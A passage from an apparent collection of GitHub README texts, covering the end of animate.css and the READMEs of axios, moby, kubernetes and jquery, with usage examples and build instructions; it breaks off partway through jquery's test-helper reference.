Name\n\n\n\n\n\n\n\nbounce\nflash\npulse\nrubberBand\n\n\nshake\nheadShake\nswing\ntada\n\n\nwobble\njello\nbounceIn\nbounceInDown\n\n\nbounceInLeft\nbounceInRight\nbounceInUp\nbounceOut\n\n\nbounceOutDown\nbounceOutLeft\nbounceOutRight\nbounceOutUp\n\n\nfadeIn\nfadeInDown\nfadeInDownBig\nfadeInLeft\n\n\nfadeInLeftBig\nfadeInRight\nfadeInRightBig\nfadeInUp\n\n\nfadeInUpBig\nfadeOut\nfadeOutDown\nfadeOutDownBig\n\n\nfadeOutLeft\nfadeOutLeftBig\nfadeOutRight\nfadeOutRightBig\n\n\nfadeOutUp\nfadeOutUpBig\nflipInX\nflipInY\n\n\nflipOutX\nflipOutY\nlightSpeedIn\nlightSpeedOut\n\n\nrotateIn\nrotateInDownLeft\nrotateInDownRight\nrotateInUpLeft\n\n\nrotateInUpRight\nrotateOut\nrotateOutDownLeft\nrotateOutDownRight\n\n\nrotateOutUpLeft\nrotateOutUpRight\nhinge\njackInTheBox\n\n\nrollIn\nrollOut\nzoomIn\nzoomInDown\n\n\nzoomInLeft\nzoomInRight\nzoomInUp\nzoomOut\n\n\nzoomOutDown\nzoomOutLeft\nzoomOutRight\nzoomOutUp\n\n\nslideInDown\nslideInLeft\nslideInRight\nslideInUp\n\n\nslideOutDown\nslideOutLeft\nslideOutRight\nslideOutUp\n\n\nheartBeat\n\n\n\n\n\n\nFull example:\n<h1 class=\"animated infinite bounce delay-2s\">Example</h1>\nCheck out all the animations here!\nIt's possible to change the duration of your animations, add a delay or change the number of times that it plays:\n.yourElement {\n  animation-duration: 3s;\n  animation-delay: 2s;\n  animation-iteration-count: infinite;\n}\nUsage with Javascript\nYou can do a whole bunch of other stuff with animate.css when you combine it with Javascript. A simple example:\nconst element =  document.querySelector('.my-element')\nelement.classList.add('animated', 'bounceOutLeft')\nYou can also detect when an animation ends:\nconst element =  document.querySelector('.my-element')\nelement.classList.add('animated', 'bounceOutLeft')\n\nelement.addEventListener('animationend', function() { doSomething() })\nYou can use this simple function to add and remove the animations:\nfunction animateCSS(element, animationName, callback) {\n    const node = document.querySelector(element)\n    node.classList.add('animated', animationName)\n\n    function handleAnimationEnd() {\n        node.classList.remove('animated', animationName)\n        node.removeEventListener('animationend', handleAnimationEnd)\n\n        if (typeof callback === 'function') callback()\n    }\n\n    node.addEventListener('animationend', handleAnimationEnd)\n}\nAnd use it like this:\nanimateCSS('.my-element', 'bounce')\n\n// or\nanimateCSS('.my-element', 'bounce', function() {\n  // Do something after animation\n})\nNotice that the examples are using ES6's const declaration, dropping support for IE10 and some aging browsers. If you prefer, switch the const to var declarations and IE10 and some old browsers will get support (they still have to provide classList support, so do your research).\nSetting Delay and Speed\nDelay Class\nIt's possible to add delays directly on the element's class attribute, just like this:\n<div class=\"animated bounce delay-2s\">Example</div>\n\n\n\nClass Name\nDelay Time\n\n\n\n\ndelay-2s\n2s\n\n\ndelay-3s\n3s\n\n\ndelay-4s\n4s\n\n\ndelay-5s\n5s\n\n\n\n\nNote: The default delays are from 1 second to 5 seconds only. If you need custom delays, add it directly to your own CSS code.\n\nSlow, Slower, Fast, and Faster Class\nIt's possible to control the speed of the animation by adding these classes, as a sample below:\n<div class=\"animated bounce faster\">Example</div>\n\n\n\nClass Name\nSpeed Time\n\n\n\n\nslow\n2s\n\n\nslower\n3s\n\n\nfast\n800ms\n\n\nfaster\n500ms\n\n\n\n\nNote: The animated class has a default speed of 1s. If you need custom duration, add it directly to your own CSS code.\n\nCustom Builds\nAnimate.css is powered by gulp.js, which means you can create custom builds pretty easily. First of all, you\u2019ll need Gulp and all other dependencies:\n$ cd path/to/animate.css/\n$ sudo npm install\nNext, run gulp to compile your custom builds. For example, if you want only some of the \u201cattention seekers\u201d, simply edit the animate-config.json file to select only the animations you want to use.\n\"attention_seekers\": {\n  \"bounce\": true,\n  \"flash\": false,\n  \"pulse\": false,\n  \"shake\": true,\n  \"headShake\": true,\n  \"swing\": true,\n  \"tada\": true,\n  \"wobble\": true,\n  \"jello\":true\n}\nAccessibility\nAnimate.css supports the prefers-reduced-motion media query so that users with motion sensitivity can opt out of animations. On supported platforms (currently Firefox, OSX Safari and iOS Safari), users can select \"reduce motion\" on their operating system preferences and it will turn off CSS transitions for them without any further work required.\nLicense\nAnimate.css is licensed under the MIT license. (http://opensource.org/licenses/MIT)\nCode of Conduct\nThis project and everyone participating in it is governed by the Contributor Covenant Code of Conduct. By participating, you are expected to uphold this code. Please report unacceptable behavior to callmeelton@gmail.com.\nContributing\nPull requests are the way to go here. We only have two rules for submitting a pull request: match the naming convention (camelCase, categorised [fades, bounces, etc]) and let us see a demo of submitted animations in a pen. That last one is important."}, {"title": "axios/axios", "language": "JavaScript", "content": "axios\n\n\n\n\n\n\n\nPromise based HTTP client for the browser and node.js\nFeatures\n\nMake XMLHttpRequests from the browser\nMake http requests from node.js\nSupports the Promise API\nIntercept request and response\nTransform request and response data\nCancel requests\nAutomatic transforms for JSON data\nClient side support for protecting against XSRF\n\nBrowser Support\n\n\n\n\n\n\n\n\n\n\n\n\n\nLatest \u2714\nLatest \u2714\nLatest \u2714\nLatest \u2714\nLatest \u2714\n11 \u2714\n\n\n\n\nInstalling\nUsing npm:\n$ npm install axios\nUsing bower:\n$ bower install axios\nUsing yarn:\n$ yarn add axios\nUsing cdn:\n<script src=\"https://unpkg.com/axios/dist/axios.min.js\"></script>\nExample\nPerforming a GET request\nconst axios = require('axios');\n\n// Make a request for a user with a given ID\naxios.get('/user?ID=12345')\n  .then(function (response) {\n    // handle success\n    console.log(response);\n  })\n  .catch(function (error) {\n    // handle error\n    console.log(error);\n  })\n  .finally(function () {\n    // always executed\n  });\n\n// Optionally the request above could also be done as\naxios.get('/user', {\n    params: {\n      ID: 12345\n    }\n  })\n  .then(function (response) {\n    console.log(response);\n  })\n  .catch(function (error) {\n    console.log(error);\n  })\n  .then(function () {\n    // always executed\n  });  \n\n// Want to use async/await? Add the `async` keyword to your outer function/method.\nasync function getUser() {\n  try {\n    const response = await axios.get('/user?ID=12345');\n    console.log(response);\n  } catch (error) {\n    console.error(error);\n  }\n}\n\nNOTE: async/await is part of ECMAScript 2017 and is not supported in Internet\nExplorer and older browsers, so use with caution.\n\nPerforming a POST request\naxios.post('/user', {\n    firstName: 'Fred',\n    lastName: 'Flintstone'\n  })\n  .then(function (response) {\n    console.log(response);\n  })\n  .catch(function (error) {\n    console.log(error);\n  });\nPerforming multiple concurrent requests\nfunction getUserAccount() {\n  return axios.get('/user/12345');\n}\n\nfunction getUserPermissions() {\n  return axios.get('/user/12345/permissions');\n}\n\naxios.all([getUserAccount(), getUserPermissions()])\n  .then(axios.spread(function (acct, perms) {\n    // Both requests are now complete\n  }));\naxios API\nRequests can be made by passing the relevant config to axios.\naxios(config)\n// Send a POST request\naxios({\n  method: 'post',\n  url: '/user/12345',\n  data: {\n    firstName: 'Fred',\n    lastName: 'Flintstone'\n  }\n});\n// GET request for remote image\naxios({\n  method: 'get',\n  url: 'http://bit.ly/2mTM3nY',\n  responseType: 'stream'\n})\n  .then(function (response) {\n    response.data.pipe(fs.createWriteStream('ada_lovelace.jpg'))\n  });\naxios(url[, config])\n// Send a GET request (default method)\naxios('/user/12345');\nRequest method aliases\nFor convenience aliases have been provided for all supported request methods.\naxios.request(config)\naxios.get(url[, config])\naxios.delete(url[, config])\naxios.head(url[, config])\naxios.options(url[, config])\naxios.post(url[, data[, config]])\naxios.put(url[, data[, config]])\naxios.patch(url[, data[, config]])\nNOTE\nWhen using the alias methods url, method, and data properties don't need to be specified in config.\nConcurrency\nHelper functions for dealing with concurrent requests.\naxios.all(iterable)\naxios.spread(callback)\nCreating an instance\nYou can create a new instance of axios with a custom config.\naxios.create([config])\nconst instance = axios.create({\n  baseURL: 'https://some-domain.com/api/',\n  timeout: 1000,\n  headers: {'X-Custom-Header': 'foobar'}\n});\nInstance methods\nThe available instance methods are listed below. The specified config will be merged with the instance config.\naxios#request(config)\naxios#get(url[, config])\naxios#delete(url[, config])\naxios#head(url[, config])\naxios#options(url[, config])\naxios#post(url[, data[, config]])\naxios#put(url[, data[, config]])\naxios#patch(url[, data[, config]])\naxios#getUri([config])\nRequest Config\nThese are the available config options for making requests. Only the url is required. Requests will default to GET if method is not specified.\n{\n  // `url` is the server URL that will be used for the request\n  url: '/user',\n\n  // `method` is the request method to be used when making the request\n  method: 'get', // default\n\n  // `baseURL` will be prepended to `url` unless `url` is absolute.\n  // It can be convenient to set `baseURL` for an instance of axios to pass relative URLs\n  // to methods of that instance.\n  baseURL: 'https://some-domain.com/api/',\n\n  // `transformRequest` allows changes to the request data before it is sent to the server\n  // This is only applicable for request methods 'PUT', 'POST', and 'PATCH'\n  // The last function in the array must return a string or an instance of Buffer, ArrayBuffer,\n  // FormData or Stream\n  // You may modify the headers object.\n  transformRequest: [function (data, headers) {\n    // Do whatever you want to transform the data\n\n    return data;\n  }],\n\n  // `transformResponse` allows changes to the response data to be made before\n  // it is passed to then/catch\n  transformResponse: [function (data) {\n    // Do whatever you want to transform the data\n\n    return data;\n  }],\n\n  // `headers` are custom headers to be sent\n  headers: {'X-Requested-With': 'XMLHttpRequest'},\n\n  // `params` are the URL parameters to be sent with the request\n  // Must be a plain object or a URLSearchParams object\n  params: {\n    ID: 12345\n  },\n\n  // `paramsSerializer` is an optional function in charge of serializing `params`\n  // (e.g. https://www.npmjs.com/package/qs, http://api.jquery.com/jquery.param/)\n  paramsSerializer: function (params) {\n    return Qs.stringify(params, {arrayFormat: 'brackets'})\n  },\n\n  // `data` is the data to be sent as the request body\n  // Only applicable for request methods 'PUT', 'POST', and 'PATCH'\n  // When no `transformRequest` is set, must be of one of the following types:\n  // - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams\n  // - Browser only: FormData, File, Blob\n  // - Node only: Stream, Buffer\n  data: {\n    firstName: 'Fred'\n  },\n\n  // `timeout` specifies the number of milliseconds before the request times out.\n  // If the request takes longer than `timeout`, the request will be aborted.\n  timeout: 1000, // default is `0` (no timeout)\n\n  // `withCredentials` indicates whether or not cross-site Access-Control requests\n  // should be made using credentials\n  withCredentials: false, // default\n\n  // `adapter` allows custom handling of requests which makes testing easier.\n  // Return a promise and supply a valid response (see lib/adapters/README.md).\n  adapter: function (config) {\n    /* ... */\n  },\n\n  // `auth` indicates that HTTP Basic auth should be used, and supplies credentials.\n  // This will set an `Authorization` header, overwriting any existing\n  // `Authorization` custom headers you have set using `headers`.\n  auth: {\n    username: 'janedoe',\n    password: 's00pers3cret'\n  },\n\n  // `responseType` indicates the type of data that the server will respond with\n  // options are: 'arraybuffer', 'document', 'json', 'text', 'stream'\n  //   browser only: 'blob'\n  responseType: 'json', // default\n\n  // `responseEncoding` indicates encoding to use for decoding responses\n  // Note: Ignored for `responseType` of 'stream' or client-side requests\n  responseEncoding: 'utf8', // default\n\n  // `xsrfCookieName` is the name of the cookie to use as a value for xsrf token\n  xsrfCookieName: 'XSRF-TOKEN', // default\n\n  // `xsrfHeaderName` is the name of the http header that carries the xsrf token value\n  xsrfHeaderName: 'X-XSRF-TOKEN', // default\n\n  // `onUploadProgress` allows handling of progress events for uploads\n  onUploadProgress: function (progressEvent) {\n    // Do whatever you want with the native progress event\n  },\n\n  // `onDownloadProgress` allows handling of progress events for downloads\n  onDownloadProgress: function (progressEvent) {\n    // Do whatever you want with the native progress event\n  },\n\n  // `maxContentLength` defines the max size of the http response content in bytes allowed\n  maxContentLength: 2000,\n\n  // `validateStatus` defines whether to resolve or reject the promise for a given\n  // HTTP response status code. If `validateStatus` returns `true` (or is set to `null`\n  // or `undefined`), the promise will be resolved; otherwise, the promise will be\n  // rejected.\n  validateStatus: function (status) {\n    return status >= 200 && status < 300; // default\n  },\n\n  // `maxRedirects` defines the maximum number of redirects to follow in node.js.\n  // If set to 0, no redirects will be followed.\n  maxRedirects: 5, // default\n\n  // `socketPath` defines a UNIX Socket to be used in node.js.\n  // e.g. '/var/run/docker.sock' to send requests to the docker daemon.\n  // Only either `socketPath` or `proxy` can be specified.\n  // If both are specified, `socketPath` is used.\n  socketPath: null, // default\n\n  // `httpAgent` and `httpsAgent` define a custom agent to be used when performing http\n  // and https requests, respectively, in node.js. This allows options to be added like\n  // `keepAlive` that are not enabled by default.\n  httpAgent: new http.Agent({ keepAlive: true }),\n  httpsAgent: new https.Agent({ keepAlive: true }),\n\n  // 'proxy' defines the hostname and port of the proxy server.\n  // You can also define your proxy using the conventional `http_proxy` and\n  // `https_proxy` environment variables. If you are using environment variables\n  // for your proxy configuration, you can also define a `no_proxy` environment\n  // variable as a comma-separated list of domains that should not be proxied.\n  // Use `false` to disable proxies, ignoring environment variables.\n  // `auth` indicates that HTTP Basic auth should be used to connect to the proxy, and\n  // supplies credentials.\n  // This will set an `Proxy-Authorization` header, overwriting any existing\n  // `Proxy-Authorization` custom headers you have set using `headers`.\n  proxy: {\n    host: '127.0.0.1',\n    port: 9000,\n    auth: {\n      username: 'mikeymike',\n      password: 'rapunz3l'\n    }\n  },\n\n  // `cancelToken` specifies a cancel token that can be used to cancel the request\n  // (see Cancellation section below for details)\n  cancelToken: new CancelToken(function (cancel) {\n  })\n}\nResponse Schema\nThe response for a request contains the following information.\n{\n  // `data` is the response that was provided by the server\n  data: {},\n\n  // `status` is the HTTP status code from the server response\n  status: 200,\n\n  // `statusText` is the HTTP status message from the server response\n  statusText: 'OK',\n\n  // `headers` the headers that the server responded with\n  // All header names are lower cased\n  headers: {},\n\n  // `config` is the config that was provided to `axios` for the request\n  config: {},\n\n  // `request` is the request that generated this response\n  // It is the last ClientRequest instance in node.js (in redirects)\n  // and an XMLHttpRequest instance the browser\n  request: {}\n}\nWhen using then, you will receive the response as follows:\naxios.get('/user/12345')\n  .then(function (response) {\n    console.log(response.data);\n    console.log(response.status);\n    console.log(response.statusText);\n    console.log(response.headers);\n    console.log(response.config);\n  });\nWhen using catch, or passing a rejection callback as second parameter of then, the response will be available through the error object as explained in the Handling Errors section.\nConfig Defaults\nYou can specify config defaults that will be applied to every request.\nGlobal axios defaults\naxios.defaults.baseURL = 'https://api.example.com';\naxios.defaults.headers.common['Authorization'] = AUTH_TOKEN;\naxios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';\nCustom instance defaults\n// Set config defaults when creating the instance\nconst instance = axios.create({\n  baseURL: 'https://api.example.com'\n});\n\n// Alter defaults after instance has been created\ninstance.defaults.headers.common['Authorization'] = AUTH_TOKEN;\nConfig order of precedence\nConfig will be merged with an order of precedence. The order is library defaults found in lib/defaults.js, then defaults property of the instance, and finally config argument for the request. The latter will take precedence over the former. Here's an example.\n// Create an instance using the config defaults provided by the library\n// At this point the timeout config value is `0` as is the default for the library\nconst instance = axios.create();\n\n// Override timeout default for the library\n// Now all requests using this instance will wait 2.5 seconds before timing out\ninstance.defaults.timeout = 2500;\n\n// Override timeout for this request as it's known to take a long time\ninstance.get('/longRequest', {\n  timeout: 5000\n});\nInterceptors\nYou can intercept requests or responses before they are handled by then or catch.\n// Add a request interceptor\naxios.interceptors.request.use(function (config) {\n    // Do something before request is sent\n    return config;\n  }, function (error) {\n    // Do something with request error\n    return Promise.reject(error);\n  });\n\n// Add a response interceptor\naxios.interceptors.response.use(function (response) {\n    // Do something with response data\n    return response;\n  }, function (error) {\n    // Do something with response error\n    return Promise.reject(error);\n  });\nIf you may need to remove an interceptor later you can.\nconst myInterceptor = axios.interceptors.request.use(function () {/*...*/});\naxios.interceptors.request.eject(myInterceptor);\nYou can add interceptors to a custom instance of axios.\nconst instance = axios.create();\ninstance.interceptors.request.use(function () {/*...*/});\nHandling Errors\naxios.get('/user/12345')\n  .catch(function (error) {\n    if (error.response) {\n      // The request was made and the server responded with a status code\n      // that falls out of the range of 2xx\n      console.log(error.response.data);\n      console.log(error.response.status);\n      console.log(error.response.headers);\n    } else if (error.request) {\n      // The request was made but no response was received\n      // `error.request` is an instance of XMLHttpRequest in the browser and an instance of\n      // http.ClientRequest in node.js\n      console.log(error.request);\n    } else {\n      // Something happened in setting up the request that triggered an Error\n      console.log('Error', error.message);\n    }\n    console.log(error.config);\n  });\nYou can define a custom HTTP status code error range using the validateStatus config option.\naxios.get('/user/12345', {\n  validateStatus: function (status) {\n    return status < 500; // Reject only if the status code is greater than or equal to 500\n  }\n})\nCancellation\nYou can cancel a request using a cancel token.\n\nThe axios cancel token API is based on the withdrawn cancelable promises proposal.\n\nYou can create a cancel token using the CancelToken.source factory as shown below:\nconst CancelToken = axios.CancelToken;\nconst source = CancelToken.source();\n\naxios.get('/user/12345', {\n  cancelToken: source.token\n}).catch(function (thrown) {\n  if (axios.isCancel(thrown)) {\n    console.log('Request canceled', thrown.message);\n  } else {\n    // handle error\n  }\n});\n\naxios.post('/user/12345', {\n  name: 'new name'\n}, {\n  cancelToken: source.token\n})\n\n// cancel the request (the message parameter is optional)\nsource.cancel('Operation canceled by the user.');\nYou can also create a cancel token by passing an executor function to the CancelToken constructor:\nconst CancelToken = axios.CancelToken;\nlet cancel;\n\naxios.get('/user/12345', {\n  cancelToken: new CancelToken(function executor(c) {\n    // An executor function receives a cancel function as a parameter\n    cancel = c;\n  })\n});\n\n// cancel the request\ncancel();\n\nNote: you can cancel several requests with the same cancel token.\n\nUsing application/x-www-form-urlencoded format\nBy default, axios serializes JavaScript objects to JSON. To send data in the application/x-www-form-urlencoded format instead, you can use one of the following options.\nBrowser\nIn a browser, you can use the URLSearchParams API as follows:\nconst params = new URLSearchParams();\nparams.append('param1', 'value1');\nparams.append('param2', 'value2');\naxios.post('/foo', params);\n\nNote that URLSearchParams is not supported by all browsers (see caniuse.com), but there is a polyfill available (make sure to polyfill the global environment).\n\nAlternatively, you can encode data using the qs library:\nconst qs = require('qs');\naxios.post('/foo', qs.stringify({ 'bar': 123 }));\nOr in another way (ES6),\nimport qs from 'qs';\nconst data = { 'bar': 123 };\nconst options = {\n  method: 'POST',\n  headers: { 'content-type': 'application/x-www-form-urlencoded' },\n  data: qs.stringify(data),\n  url,\n};\naxios(options);\nNode.js\nIn node.js, you can use the querystring module as follows:\nconst querystring = require('querystring');\naxios.post('http://something.com/', querystring.stringify({ foo: 'bar' }));\nYou can also use the qs library.\nNOTE\nThe qs library is preferable if you need to stringify nested objects, as the querystring method has known issues with that use case (https://github.com/nodejs/node-v0.x-archive/issues/1665).\nSemver\nUntil axios reaches a 1.0 release, breaking changes will be released with a new minor version. For example 0.5.1, and 0.5.4 will have the same API, but 0.6.0 will have breaking changes.\nPromises\naxios depends on a native ES6 Promise implementation to be supported.\nIf your environment doesn't support ES6 Promises, you can polyfill.\nTypeScript\naxios includes TypeScript definitions.\nimport axios from 'axios';\naxios.get('/user?ID=12345');\nResources\n\nChangelog\nUpgrade Guide\nEcosystem\nContributing Guide\nCode of Conduct\n\nCredits\naxios is heavily inspired by the $http service provided in Angular. Ultimately axios is an effort to provide a standalone $http-like service for use outside of Angular.\nLicense\nMIT"}, {"title": "moby/moby", "language": "Go", "content": "The Moby Project\n\nMoby is an open-source project created by Docker to enable and accelerate software containerization.\nIt provides a \"Lego set\" of toolkit components, the framework for assembling them into custom container-based systems, and a place for all container enthusiasts and professionals to experiment and exchange ideas.\nComponents include container build tools, a container registry, orchestration tools, a runtime and more, and these can be used as building blocks in conjunction with other tools and projects.\nPrinciples\nMoby is an open project guided by strong principles, aiming to be modular, flexible and without too strong an opinion on user experience.\nIt is open to the community to help set its direction.\n\nModular: the project includes lots of components that have well-defined functions and APIs that work together.\nBatteries included but swappable: Moby includes enough components to build fully featured container system, but its modular architecture ensures that most of the components can be swapped by different implementations.\nUsable security: Moby provides secure defaults without compromising usability.\nDeveloper focused: The APIs are intended to be functional and useful to build powerful tools.\nThey are not necessarily intended as end user tools but as components aimed at developers.\nDocumentation and UX is aimed at developers not end users.\n\nAudience\nThe Moby Project is intended for engineers, integrators and enthusiasts looking to modify, hack, fix, experiment, invent and build systems based on containers.\nIt is not for people looking for a commercially supported system, but for people who want to work and learn with open source code.\nRelationship with Docker\nThe components and tools in the Moby Project are initially the open source components that Docker and the community have built for the Docker Project.\nNew projects can be added if they fit with the community goals. Docker is committed to using Moby as the upstream for the Docker Product.\nHowever, other projects are also encouraged to use Moby as an upstream, and to reuse the components in diverse ways, and all these uses will be treated in the same way. External maintainers and contributors are welcomed.\nThe Moby project is not intended as a location for support or feature requests for Docker products, but as a place for contributors to work on open source code, fix bugs, and make the code more useful.\nThe releases are supported by the maintainers, community and users, on a best efforts basis only, and are not intended for customers who want enterprise or commercial support; Docker EE is the appropriate product for these use cases.\n\nLegal\nBrought to you courtesy of our legal counsel. For more context,\nplease see the NOTICE document in this repo.\nUse and transfer of Moby may be subject to certain restrictions by the\nUnited States and other governments.\nIt is your responsibility to ensure that your use and/or transfer does not\nviolate applicable laws.\nFor more information, please see https://www.bis.doc.gov\nLicensing\nMoby is licensed under the Apache License, Version 2.0. See\nLICENSE for the full\nlicense text."}, {"title": "kubernetes/kubernetes", "language": "Go", "content": "Kubernetes\n \n\n\nKubernetes is an open source system for managing containerized applications\nacross multiple hosts; providing basic mechanisms for deployment, maintenance,\nand scaling of applications.\nKubernetes builds upon a decade and a half of experience at Google running\nproduction workloads at scale using a system called Borg,\ncombined with best-of-breed ideas and practices from the community.\nKubernetes is hosted by the Cloud Native Computing Foundation (CNCF).\nIf you are a company that wants to help shape the evolution of\ntechnologies that are container-packaged, dynamically-scheduled\nand microservices-oriented, consider joining the CNCF.\nFor details about who's involved and how Kubernetes plays a role,\nread the CNCF announcement.\n\nTo start using Kubernetes\nSee our documentation on kubernetes.io.\nTry our interactive tutorial.\nTake a free course on Scalable Microservices with Kubernetes.\nTo start developing Kubernetes\nThe community repository hosts all information about\nbuilding Kubernetes from source, how to contribute code\nand documentation, who to contact about what, etc.\nIf you want to build Kubernetes right away there are two options:\nYou have a working Go environment.\ngo get -d k8s.io/kubernetes\ncd $GOPATH/src/k8s.io/kubernetes\nmake\n\nYou have a working Docker environment.\ngit clone https://github.com/kubernetes/kubernetes\ncd kubernetes\nmake quick-release\n\nFor the full story, head over to the developer's documentation.\nSupport\nIf you need support, start with the troubleshooting guide,\nand work your way through the process that we've outlined.\nThat said, if you have questions, reach out to us\none way or another."}, {"title": "jquery/jquery", "language": "JavaScript", "content": "jQuery \u2014 New Wave JavaScript\n\n\nContribution Guides\nIn the spirit of open source software development, jQuery always encourages community code contribution. To help you get started and before you jump into writing code, be sure to read these important contribution guidelines thoroughly:\n\nGetting Involved\nCore Style Guide\nWriting Code for jQuery Foundation Projects\n\nEnvironments in which to use jQuery\n\nBrowser support\njQuery also supports Node, browser extensions, and other non-browser environments.\n\nWhat you need to build your own jQuery\nTo build jQuery, you need to have the latest Node.js/npm and git 1.7 or later. Earlier versions might work, but are not supported.\nFor Windows, you have to download and install git and Node.js.\nOS X users should install Homebrew. Once Homebrew is installed, run brew install git to install git,\nand brew install node to install Node.js.\nLinux/BSD users should use their appropriate package managers to install git and Node.js, or build from source\nif you swing that way. Easy-peasy.\nHow to build your own jQuery\nClone a copy of the main jQuery git repo by running:\ngit clone git://github.com/jquery/jquery.git\nEnter the jquery directory and run the build script:\ncd jquery && npm run build\nThe built version of jQuery will be put in the dist/ subdirectory, along with the minified copy and associated map file.\nIf you want to create custom build or help with jQuery development, it would be better to install grunt command line interface as a global package:\nnpm install -g grunt-cli\n\nMake sure you have grunt installed by testing:\ngrunt -V\n\nNow by running the grunt command, in the jquery directory, you can build a full version of jQuery, just like with an npm run build command:\ngrunt\n\nThere are many other tasks available for jQuery Core:\ngrunt -help\n\nModules\nSpecial builds can be created that exclude subsets of jQuery functionality.\nThis allows for smaller custom builds when the builder is certain that those parts of jQuery are not being used.\nFor example, an app that only used JSONP for $.ajax() and did not need to calculate offsets or positions of elements could exclude the offset and ajax/xhr modules.\nAny module may be excluded except for core, and selector. To exclude a module, pass its path relative to the src folder (without the .js extension).\nSome example modules that can be excluded are:\n\najax: All AJAX functionality: $.ajax(), $.get(), $.post(), $.ajaxSetup(), .load(), transports, and ajax event shorthands such as .ajaxStart().\najax/xhr: The XMLHTTPRequest AJAX transport only.\najax/script: The <script> AJAX transport only; used to retrieve scripts.\najax/jsonp: The JSONP AJAX transport only; depends on the ajax/script transport.\ncss: The .css() method. Also removes all modules depending on css (including effects, dimensions, and offset).\ncss/showHide:  Non-animated .show(), .hide() and .toggle(); can be excluded if you use classes or explicit .css() calls to set the display property. Also removes the effects module.\ndeprecated: Methods documented as deprecated but not yet removed.\ndimensions: The .width() and .height() methods, including inner- and outer- variations.\neffects: The .animate() method and its shorthands such as .slideUp() or .hide(\"slow\").\nevent: The .on() and .off() methods and all event functionality. Also removes event/alias.\nevent/alias: All event attaching/triggering shorthands like .click() or .mouseover().\nevent/trigger: The .trigger() and .triggerHandler() methods. Used by the alias module.\noffset: The .offset(), .position(), .offsetParent(), .scrollLeft(), and .scrollTop() methods.\nwrap: The .wrap(), .wrapAll(), .wrapInner(), and .unwrap() methods.\ncore/ready: Exclude the ready module if you place your scripts at the end of the body. Any ready callbacks bound with jQuery() will simply be called immediately. However, jQuery(document).ready() will not be a function and .on(\"ready\", ...) or similar will not be triggered.\ndeferred: Exclude jQuery.Deferred. This also removes jQuery.Callbacks. Note that modules that depend on jQuery.Deferred(AJAX, effects, core/ready) will not be removed and will still expect jQuery.Deferred to be there. Include your own jQuery.Deferred implementation or exclude those modules as well (grunt custom:-deferred,-ajax,-effects,-core/ready).\nexports/global: Exclude the attachment of global jQuery variables ($ and jQuery) to the window.\nexports/amd: Exclude the AMD definition.\n\nAs a special case, you may also replace Sizzle by using a special flag grunt custom:-sizzle.\n\nsizzle: The Sizzle selector engine. When this module is excluded, it is replaced by a rudimentary selector engine based on the browser's querySelectorAll method that does not support jQuery selector extensions or enhanced semantics. See the selector-native.js file for details.\n\nNote: Excluding Sizzle will also exclude all jQuery selector extensions (such as effects/animatedSelector and css/hiddenVisibleSelectors).\nThe build process shows a message for each dependent module it excludes or includes.\nAMD name\nAs an option, you can set the module name for jQuery's AMD definition. By default, it is set to \"jquery\", which plays nicely with plugins and third-party libraries, but there may be cases where you'd like to change this. Simply set the \"amd\" option:\ngrunt custom --amd=\"custom-name\"\nOr, to define anonymously, set the name to an empty string.\ngrunt custom --amd=\"\"\nCustom Build Examples\nTo create a custom build, first check out the version:\ngit pull; git checkout VERSION\nWhere VERSION is the version you want to customize. Then, make sure all Node dependencies are installed:\nnpm install\nCreate the custom build using the grunt custom option, listing the modules to be excluded.\nExclude all ajax functionality:\ngrunt custom:-ajax\nExcluding css removes modules depending on CSS: effects, offset, dimensions.\ngrunt custom:-css\nExclude a bunch of modules:\ngrunt custom:-ajax,-css,-deprecated,-dimensions,-effects,-event/alias,-offset,-wrap\nFor questions or requests regarding custom builds, please start a thread on the Developing jQuery Core section of the forum. Due to the combinatorics and custom nature of these builds, they are not regularly tested in jQuery's unit test process. The non-Sizzle selector engine currently does not pass unit tests because it is missing too much essential functionality.\nRunning the Unit Tests\nMake sure you have the necessary dependencies:\nnpm install\nStart grunt watch or npm start to auto-build jQuery as you work:\ngrunt watch\nRun the unit tests with a local server that supports PHP. Ensure that you run the site from the root directory, not the \"test\" directory. No database is required. Pre-configured php local servers are available for Windows and Mac. Here are some options:\n\nWindows: WAMP download\nMac: MAMP download\nLinux: Setting up LAMP\nMongoose (most platforms)\n\nBuilding to a different directory\nTo copy the built jQuery files from /dist to another directory:\ngrunt && grunt dist:/path/to/special/location/\nWith this example, the output files would be:\n/path/to/special/location/jquery.js\n/path/to/special/location/jquery.min.js\nTo add a permanent copy destination, create a file in dist/ called \".destination.json\". Inside the file, paste and customize the following:\n{\n  \"/Absolute/path/to/other/destination\": true\n}\nAdditionally, both methods can be combined.\nEssential Git\nAs the source code is handled by the Git version control system, it's useful to know some features used.\nCleaning\nIf you want to purge your working directory back to the status of upstream, the following commands can be used (remember everything you've worked on is gone after these):\ngit reset --hard upstream/master\ngit clean -fdx\nRebasing\nFor feature/topic branches, you should always use the --rebase flag to git pull, or if you are usually handling many temporary \"to be in a github pull request\" branches, run the following to automate this:\ngit config branch.autosetuprebase local\n(see man git-config for more information)\nHandling merge conflicts\nIf you're getting merge conflicts when merging, instead of editing the conflicted files manually, you can use the feature\ngit mergetool. Even though the default tool xxdiff looks awful/old, it's rather useful.\nThe following are some commands that can be used there:\n\nCtrl + Alt + M - automerge as much as possible\nb - jump to next merge conflict\ns - change the order of the conflicted lines\nu - undo a merge\nleft mouse button - mark a block to be the winner\nmiddle mouse button - mark a line to be the winner\nCtrl + S - save\nCtrl + Q - quit\n\nQUnit Reference\nTest methods\nexpect( numAssertions );\nstop();\nstart();\nNote: QUnit's eventual addition of an argument to stop/start is ignored in this test suite so that start and stop can be passed as callbacks without worrying about their parameters.\nTest assertions\nok( value, [message] );\nequal( actual, expected, [message] );\nnotEqual( actual, expected, [message] );\ndeepEqual( actual, expected, [message] );\nnotDeepEqual( actual, expected, [message] );\nstrictEqual( actual, expected, [message] );\nnotStrictEqual( actual, expected, [message] );\nthrows( block, [expected], [message] );\nTest Suite Convenience Methods Reference (See test/data/testinit.js)\nReturns an array of elements with the given IDs\nq( ... );\nExample:\nq(\"main\", \"foo\", \"bar\");\n\n=> [ div#main, span#foo, input#bar ]\nAsserts that a selection matches the given IDs\nt( testName, selector, [ \"array\", \"of\", \"ids\" ] );\nExample:\nt(\"Check for something\", \"//[a]\", [\"foo\", \"bar\"]);\nFires a native DOM event without going through jQuery\nfireNative( node, eventType )\nExample:\nfireNative( jQuery(\"#elem\")[0], \"click\" );\nAdd random number to url to stop caching\nurl( \"some/url\" );\nExample:\nurl(\"index.html\");\n\n=> 